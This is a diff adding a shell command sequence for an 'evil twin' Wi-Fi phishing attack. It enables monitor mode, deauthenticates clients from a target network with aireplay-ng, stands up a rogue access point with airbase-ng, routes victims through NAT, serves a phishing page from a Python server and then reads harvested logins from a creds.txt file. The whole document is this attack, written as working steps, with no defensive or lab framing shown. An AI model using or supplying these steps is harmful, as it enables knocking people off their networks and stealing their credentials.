@@ -1,0 +1,54 @@
+# Enable monitor mode on wlan1
+sudo airmon-ng start wlan1
+
+# Verify monitor mode is enabled
+iwconfig
+
+# Scan for available networks
+sudo airodump-ng wlan1mon
+
+airodump-ng --bssid <id> -c <channelnumber> -w capture wlan1mon
+
+# Deauthenticate clients from the target network (replace [BSSID] and [Channel] with actual values)
+sudo aireplay-ng --deauth 0 -a [BSSID] wlan1mon
+
+# Create the rogue access point using airbase-ng (replace FakeSSID and [Channel] with actual values)
+sudo airbase-ng -e "FakeSSID" -c [Channel] wlan2
+
+# Assign an IP address to the rogue AP interface at0
+sudo ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+
+# Verify that at0 has an IP address
+ifconfig at0
+
+# Enable IP forwarding
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Flush iptables and set up NAT using wlan0 as your internet interface
+sudo iptables --flush
+sudo iptables --table nat --flush
+sudo iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
+
+# Create the phishing directory
+mkdir ~/phishing
+cd ~/phishing
+
+# Start the Python server to host the phishing page
+sudo python3 server.py
+
+systemctl restart dnsmasq
+
+# View the captured credentials
+cat ~/phishing/creds.txt
+
+# Stop monitor mode after the attack is complete
+sudo airmon-ng stop wlan1mon
+
+# Flush iptables rules to restore the system
+sudo iptables --flush
+sudo iptables --table nat --flush
+
+# Restart NetworkManager to restore network connections
+sudo systemctl start NetworkManager
+
